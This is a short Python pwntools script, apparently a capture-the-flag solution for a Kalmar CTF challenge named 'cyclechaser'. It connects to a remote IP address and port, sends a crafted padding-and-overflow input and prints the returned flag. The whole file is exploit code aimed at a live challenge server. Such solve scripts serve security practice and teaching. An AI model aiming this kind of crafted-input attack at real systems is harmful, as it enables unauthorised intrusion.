from pwn import *
import os

#os.chdir('handout')
#r = process(['./cyclechaser'])

r = remote('3.123.91.129', 13339)

seed = int(r.recvline(), 16)

stdin_data  = b'\x00' * 0x4000
stdin_data += b'\xff' * 8
stdin_data += b'\x00'

r.send(stdin_data)

print(b'kalmar{%s}' % bytes.fromhex(r.recvlineS()))